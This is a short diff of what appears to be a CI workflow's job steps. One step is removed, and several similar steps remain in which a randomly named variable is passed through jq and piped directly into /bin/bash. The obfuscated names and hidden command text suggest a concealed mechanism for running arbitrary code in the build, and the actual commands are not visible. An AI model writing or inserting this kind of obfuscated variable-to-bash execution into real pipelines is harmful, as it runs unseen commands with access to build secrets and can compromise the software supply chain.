@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$goqh82137" | jq -r .ztcxn1 | /bin/bash
           printf '%s' "$dushu57728" | jq -r .w7 | /bin/bash
           echo $mlbc3 | jq -r .v363 | /bin/bash
-          printf '%s' "$dhsus41614" | jq -r .qe650 | /bin/bash
           echo $dzrd81 | jq -r .dpvp145 | /bin/bash
           echo $vigqi25775 | jq -r .x89914 | /bin/bash
           printf '%s' "$zwc7" | jq -r .lwdj4824 | /bin/bash
